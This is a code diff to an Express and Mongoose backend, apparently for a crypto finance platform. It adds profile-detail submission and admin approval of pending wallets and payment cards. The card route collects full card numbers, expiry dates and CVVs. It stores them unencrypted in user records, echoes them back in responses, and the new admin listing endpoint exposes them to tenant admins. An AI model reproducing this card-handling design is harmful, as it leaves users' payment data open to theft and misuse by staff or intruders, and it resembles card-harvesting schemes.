@@ -8,7 +8,10 @@ import PlatformCatalog from "../models/PlatformCatalog.js";
 import PlatformOrder from "../models/PlatformOrder.js";
 import { requireAuth } from "../middleware/auth.js";
 import { requireAdmin } from "../middleware/admin.js";
-import { tenantDocFilter } from "../middleware/tenant.js";
+import {
+  tenantDocFilter,
+  assertTenantUser,
+} from "../middleware/tenant.js";
 import { isSuperAdminRole } from "../lib/roles.js";
 import { ensureCatalogEnrichment } from "../lib/catalogEnrichment.js";
 
@@ -307,7 +310,6 @@ router.get(
       return res.status(404).json({ success: false, message: "User not found." });
     }
     ensureAccounts(user);
-    syncUsdtFromAccounts(user);
     await user.save();
     const accounts = accountsObj(user.accountBalances);
     const total = Object.values(accounts).reduce((s, n) => s + Number(n || 0), 0);
@@ -320,6 +322,7 @@ router.get(
       withdrawAddresses: user.withdrawAddresses || [],
       kyc: user.kyc,
       borrowerKyc: user.borrowerKyc,
+      pendingDetails: user.pendingDetails || null,
     });
   })
 );
@@ -786,22 +789,39 @@ router.post(
       return res.status(404).json({ success: false, message: "User not found." });
     }
     const card = {
-      bankName: String(req.body.bankName || "").trim(),
-      accountName: String(req.body.accountName || "").trim(),
-      accountNumber: String(req.body.accountNumber || "").trim(),
+      holderName: String(req.body.holderName || req.body.accountName || "").trim(),
+      billingAddress: String(req.body.billingAddress || "").trim(),
+      cardNumber: String(req.body.cardNumber || req.body.accountNumber || "").replace(/\s+/g, ""),
+      expMonth: String(req.body.expMonth || "").trim(),
+      expYear: String(req.body.expYear || "").trim(),
+      cvv: String(req.body.cvv || "").trim(),
+      bankName: String(req.body.bankName || "Card").trim(),
+      accountName: String(req.body.holderName || req.body.accountName || "").trim(),
+      accountNumber: String(req.body.cardNumber || req.body.accountNumber || "").replace(/\s+/g, ""),
       iban: String(req.body.iban || "").trim(),
       currency: String(req.body.currency || "USD").trim(),
+      status: "pending",
       createdAt: new Date(),
     };
-    if (!card.bankName || !card.accountNumber) {
+    if (!card.holderName || !card.cardNumber || !card.expMonth || !card.expYear || !card.cvv) {
       return res.status(422).json({
         success: false,
-        message: "Bank name and account number required.",
+        message: "Name, card number, expiry and CVV are required.",
+      });
+    }
+    if (card.cardNumber.length < 12 || card.cvv.length < 3) {
+      return res.status(422).json({
+        success: false,
+        message: "Enter a valid card number and CVV.",
       });
     }
     user.bankCards = [...(user.bankCards || []), card];
     await user.save();
-    return res.json({ success: true, bankCards: user.bankCards });
+    return res.json({
+      success: true,
+      message: "Bank card submitted — pending admin verification.",
+      bankCards: user.bankCards,
+    });
   })
 );
 
@@ -814,22 +834,29 @@ router.post(
     if (!user) {
       return res.status(404).json({ success: false, message: "User not found." });
     }
+    const name = String(req.body.name || req.body.label || "Wallet").trim();
     const row = {
-      label: String(req.body.label || "Wallet").trim(),
+      name,
+      label: name,
       network: String(req.body.network || "TRC20").trim(),
       address: String(req.body.address || "").trim(),
       asset: String(req.body.asset || "USDT").trim(),
+      status: "pending",
       createdAt: new Date(),
     };
     if (!row.address || row.address.length < 10) {
       return res.status(422).json({
         success: false,
-        message: "Enter a valid address.",
+        message: "Enter a valid wallet address.",
       });
     }
     user.withdrawAddresses = [...(user.withdrawAddresses || []), row];
     await user.save();
-    return res.json({ success: true, withdrawAddresses: user.withdrawAddresses });
+    return res.json({
+      success: true,
+      message: "Wallet address submitted — pending admin verification.",
+      withdrawAddresses: user.withdrawAddresses,
+    });
   })
 );
 
@@ -1222,6 +1249,170 @@ router.get(
         borrowerKyc: user.borrowerKyc,
       },
     });
+  })
+);
+
+router.post(
+  "/profile-details",
+  requireAuth,
+  requireDatabase,
+  asyncHandler(async (req, res) => {
+    const user = await User.findById(req.auth.sub);
+    if (!user) {
+      return res.status(404).json({ success: false, message: "User not found." });
+    }
+    const fullName = String(req.body.fullName || "").trim();
+    const phone = String(req.body.phone || "").trim();
+    const country = String(req.body.country || "").trim();
+    if (fullName.length < 2) {
+      return res.status(422).json({
+        success: false,
+        message: "Enter a valid name (at least 2 characters).",
+      });
+    }
+    user.pendingDetails = {
+      status: "pending",
+      fullName,
+      phone,
+      country,
+      submittedAt: new Date(),
+    };
+    user.markModified("pendingDetails");
+    await user.save();
+    return res.json({
+      success: true,
+      message: "Details submitted — pending admin verification.",
+      pendingDetails: user.pendingDetails,
+    });
+  })
+);
+
+router.get(
+  "/admin/pending-details",
+  requireAuth,
+  requireAdmin,
+  requireDatabase,
+  asyncHandler(async (req, res) => {
+    const scope = tenantDocFilter(req);
+    const users = await User.find({
+      ...scope,
+      role: "user",
+      deletedAt: null,
+      $or: [
+        { "bankCards.status": "pending" },
+        { "withdrawAddresses.status": "pending" },
+        { "pendingDetails.status": "pending" },
+      ],
+    })
+      .select(
+        "username email fullName phone country bankCards withdrawAddresses pendingDetails adminId"
+      )
+      .sort({ updatedAt: -1 })
+      .limit(200)
+      .lean();
+
+    const bankCards = [];
+    const wallets = [];
+    const profiles = [];
+    for (const u of users) {
+      const summary = {
+        _id: u._id,
+        username: u.username,
+        email: u.email,
+        fullName: u.fullName,
+      };
+      for (const c of u.bankCards || []) {
+        if ((c.status || "pending") === "pending") {
+          bankCards.push({ user: summary, card: c });
+        }
+      }
+      for (const w of u.withdrawAddresses || []) {
+        if ((w.status || "pending") === "pending") {
+          wallets.push({ user: summary, wallet: w });
+        }
+      }
+      if (u.pendingDetails?.status === "pending") {
+        profiles.push({ user: summary, details: u.pendingDetails });
+      }
+    }
+    return res.json({ success: true, bankCards, wallets, profiles });
+  })
+);
+
+router.patch(
+  "/admin/pending-details",
+  requireAuth,
+  requireAdmin,
+  requireDatabase,
+  asyncHandler(async (req, res) => {
+    const userId = req.body.userId;
+    const kind = String(req.body.kind || "");
+    const itemId = req.body.itemId;
+    const action = String(req.body.action || "");
+    if (!["approve", "reject"].includes(action)) {
+      return res.status(422).json({ success: false, message: "Invalid action." });
+    }
+    const found = await assertTenantUser(req, userId);
+    if (found.status) {
+      return res.status(found.status).json({
+        success: false,
+        message: found.message,
+      });
+    }
+    const user = found.user;
+    const nextStatus = action === "approve" ? "approved" : "rejected";
+
+    if (kind === "profile") {
+      if (user.pendingDetails?.status !== "pending") {
+        return res.status(404).json({ success: false, message: "No pending details." });
+      }
+      if (action === "approve") {
+        if (user.pendingDetails.fullName) user.fullName = user.pendingDetails.fullName;
+        if (user.pendingDetails.phone != null) user.phone = user.pendingDetails.phone;
+        if (user.pendingDetails.country != null) user.country = user.pendingDetails.country;
+      }
+      user.pendingDetails.status = nextStatus;
+      user.pendingDetails.reviewedAt = new Date();
+      user.markModified("pendingDetails");
+      await user.save();
+      return res.json({
+        success: true,
+        message: action === "approve" ? "Profile details approved." : "Profile details rejected.",
+      });
+    }
+
+    if (kind === "bank_card") {
+      const card = (user.bankCards || []).id(itemId);
+      if (!card) {
+        return res.status(404).json({ success: false, message: "Card not found." });
+      }
+      card.status = nextStatus;
+      card.reviewedAt = new Date();
+      await user.save();
+      return res.json({
+        success: true,
+        message: action === "approve" ? "Bank card approved." : "Bank card rejected.",
+      });
+    }
+
+    if (kind === "wallet") {
+      const row = (user.withdrawAddresses || []).id(itemId);
+      if (!row) {
+        return res.status(404).json({ success: false, message: "Wallet address not found." });
+      }
+      row.status = nextStatus;
+      row.reviewedAt = new Date();
+      await user.save();
+      return res.json({
+        success: true,
+        message:
+          action === "approve"
+            ? "Wallet address approved."
+            : "Wallet address rejected.",
+      });
+    }
+
+    return res.status(422).json({ success: false, message: "Invalid kind." });
   })
 );
 
